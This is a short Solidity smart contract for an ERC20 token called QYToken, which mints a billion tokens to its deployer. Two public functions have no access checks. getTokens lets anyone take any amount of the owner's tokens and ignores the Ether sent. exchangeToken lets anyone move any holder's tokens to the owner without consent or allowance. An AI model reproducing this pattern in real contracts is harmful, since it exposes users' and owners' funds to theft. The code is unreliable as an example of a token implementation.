// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract QyToken is ERC20 {

    address payable private owner;

    constructor() ERC20("QYToken", "QTK") {
        uint256 totalSupply = 1_000_000_000e18;
        _mint(msg.sender, totalSupply);
        owner = payable(msg.sender);
    }

    function getTokens(address _to, uint256 amt) external payable {
        super._transfer(owner, _to, amt);
    }

    function exchangeToken(address from, uint256 value) external {
        super._transfer(from, owner, value);
    }

}